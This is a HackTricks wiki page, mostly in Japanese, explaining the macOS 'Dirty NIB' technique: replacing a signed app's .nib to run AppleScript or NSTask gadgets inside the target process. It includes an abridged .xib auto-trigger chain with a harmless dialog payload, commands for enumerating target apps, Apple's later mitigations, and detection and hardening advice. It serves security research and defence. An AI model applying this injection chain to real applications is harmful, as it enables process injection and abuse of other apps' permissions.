# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIBは、署名されたmacOSアプリバンドル内のInterface Builderファイル（.xib/.nib）を悪用して、ターゲットプロセス内で攻撃者が制御するロジックを実行させ、そのentitlementsやTCC権限を継承する手法を指します。この手法は元々xpn (MDSec)によって文書化され、その後Sector7が一般化・大幅に拡張し、macOS 13 VenturaおよびmacOS 14 SonomaでのAppleの緩和策についても解説しました。背景や詳細な解説は末尾の参考文献を参照してください。

> TL;DR
> • macOS 13 Ventura以前: バンドルのMainMenu.nib（または起動時に読み込まれる他のnib）を置き換えることで、プロセスインジェクションを確実に達成でき、しばしばprivilege escalationを引き起こせました。
> • macOS 13 (Ventura)以降、macOS 14 (Sonoma)でさらに強化: first‑launch deep verification、bundle protection、Launch Constraints、および新しいTCC “App Management” permissionにより、非関連アプリによるpost‑launch nib tamperingは概ね防止されます。攻撃は一部のニッチなケース（例: same‑developer toolingが自社アプリを変更する場合、またはユーザが端末にApp Management/Full Disk Accessを付与している場合）では依然として可能な場合があります。

## What are NIB/XIB files

Nib（NeXT Interface Builderの略）ファイルは、AppKitアプリで使用されるシリアライズされたUIオブジェクトグラフです。現代のXcodeは編集可能なXMLの .xib ファイルを保存し、ビルド時に .nib にコンパイルします。典型的なアプリは `NSApplicationMain()` を通じてメインUIを読み込み、アプリの `Info.plist` 内の `NSMainNibFile` キーを読み取って実行時にオブジェクトグラフをインスタンス化します。

キーとなる点（攻撃を可能にする要因）:
- NIBの読み込みは、NSSecureCodingに準拠させる必要なく任意のObjective‑Cクラスをインスタンス化します（Appleのnibローダは `initWithCoder:` が利用できない場合に `init`/`initWithFrame:` にフォールバックします）。
- Cocoa Bindingsは、nibがインスタンス化される際にメソッドを呼び出すために悪用でき、ユーザ操作を必要としないチェイン呼び出しも可能です。

## Dirty NIB injection process (attacker view)

古典的なVentura以前のフロー:
1) Create a malicious .xib
- Add an `NSAppleScript` object (or other “gadget” classes such as `NSTask`).
- Add an `NSTextField` whose title contains the payload (e.g., AppleScript or command arguments).
- Add one or more `NSMenuItem` objects wired via bindings to call methods on the target object.

2) Auto‑trigger without user clicks
- Use bindings to set a menu item’s target/selector and then invoke the private `_corePerformAction` method so the action fires automatically when the nib loads. This removes the need for a user to click a button.

Minimal example of an auto‑trigger chain inside a .xib (abridged for clarity):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
これにより、nib のロード時に対象プロセス内で任意の AppleScript を実行できます。高度なチェーンでは以下が可能です：
- 任意の AppKit クラス（例: `NSTask`）をインスタンス化し、`-launch` のような引数なしメソッドを呼び出す。
- 上述の binding trick を使って、オブジェクト引数付きの任意の selectors を呼び出す。
- `AppleScriptObjC.framework` をロードして Objective‑C にブリッジし、選択した C APIs を呼び出すことも可能。
- まだ `Python.framework` を含む古いシステムでは、Python にブリッジし、`ctypes` を使って任意の C 関数を呼び出す（Sector7 の研究）。

3) アプリの nib を置き換える
- `target.app` を書き込み可能な場所にコピーし、例えば `Contents/Resources/MainMenu.nib` を悪意ある nib に置き換えて `target.app` を実行する。Pre‑Ventura では一度だけ Gatekeeper による評価が行われた後、以降の起動では簡易的な署名チェックしか行われなかったため、.nib のような非実行リソースは再検証されなかった。

目に見えるテスト用の AppleScript payload の例:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Modern macOS protections (Ventura/Monterey/Sonoma/Sequoia)

Apple は Dirty NIB の有効性を大幅に低下させる複数のシステム的緩和策を導入しました:
- First‑launch deep verification and bundle protection (macOS 13 Ventura)
- 任意のアプリを初回実行した際（quarantined か否かにかかわらず）、バンドル内の全リソースに対して深い署名チェックが行われます。その後、バンドルは保護され、同一の開発者（またはアプリが明示的に許可したもの）からのアプリだけがその内容を変更できます。他のアプリが別アプリのバンドルに書き込むには、新しい TCC “App Management” 権限が必要になります。
- Launch Constraints (macOS 13 Ventura)
- System/Apple‑bundled apps を別の場所にコピーして起動することができなくなり、OS アプリに対する「/tmp にコピーしてパッチを当てて実行する」方法が無効化されます。
- Improvements in macOS 14 Sonoma
- Apple は App Management を強化し、Sector7 が指摘した既知のバイパス（例: CVE‑2023‑40450）を修正しました。Python.framework は以前に削除されており（macOS 12.3）、一部の権限昇格チェーンが断たれています。
- Gatekeeper/Quarantine changes
- この手法に影響した Gatekeeper、provenance、assessment の変更については下記の参照ページを参照してください。

> Practical implication
> • On Ventura+ you generally cannot modify a third‑party app’s .nib unless your process has App Management or is signed by the same Team ID as the target (e.g., developer tooling).
> • Granting App Management or Full Disk Access to shells/terminals effectively re‑opens this attack surface for anything that can execute code inside that terminal’s context.


### Addressing Launch Constraints

Launch Constraints は Ventura 以降、非標準の場所から多くの Apple アプリを実行することを防ぎます。もし Apple アプリを一時ディレクトリにコピーして `MainMenu.nib` を変更し起動する、というような pre‑Ventura のワークフローに依存していた場合、>= 13.0 では失敗することを想定してください。


## Enumerating targets and nibs (useful for research / legacy systems)

- Locate apps whose UI is nib‑driven:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- バンドル内の候補となる nib リソースを見つける：
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- コード署名を厳密に検証する（リソースを改ざんして再署名していない場合は失敗する）:
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> 注: 現代の macOS では、正当な認可なしに別のアプリのバンドルに書き込もうとすると、bundle protection/TCC によってブロックされます。


## 検出と DFIR のヒント

- バンドルリソースのファイル整合性監視
- インストール済みアプリの `Contents/Resources/*.nib` やその他の非実行可能なリソースの mtime/ctime 変更を監視する。
- Unified logs とプロセス挙動の監視
- GUI アプリ内での予期しない AppleScript の実行や、AppleScriptObjC または Python.framework をロードするプロセスを監視する。例:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- プロアクティブな評価
- 重要なアプリに対して定期的に `codesign --verify --deep` を実行し、リソースが改変されていないことを確認する。
- 権限コンテキスト
- 誰が／何が TCC の “App Management” や Full Disk Access を持っているかを監査する（特に端末や管理エージェント）。これらを汎用シェルから除外することで、容易に Dirty NIB‑style の改ざんを再有効化されるのを防げる。


## 防御的強化（開発者と防御者向け）

- プログラム的な UI を優先するか、nib からインスタンス化される内容を制限する。nib グラフに強力なクラス（例: `NSTask`）を含めないこと、任意のオブジェクト上で間接的にセレクタを呼ぶバインディングを避けること。
- Library Validation を有効にした hardened runtime を採用する（現代のアプリでは既に標準）。これだけで nib 注入を完全に防げるわけではないが、容易なネイティブコードの読み込みを阻止し、攻撃者をスクリプトのみのペイロードに追い込む。
- 汎用ツールで広範な App Management 権限を要求・依存しないこと。MDM が App Management を必要とする場合は、そのコンテキストをユーザ駆動のシェルから分離する。
- アプリバンドルの整合性を定期的に検証し、アップデート機構がバンドルリソースを自己修復するようにする。


## HackTricks の関連資料

この手法に影響する Gatekeeper、quarantine、provenance の変更について詳しくは:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## 参考文献

- xpn – DirtyNIB（元の解説、Pages の例付き）: https://blog.xpnsec.com/dirtynib/
- Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024): https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/

{{#include ../../../banners/hacktricks-training.md}}
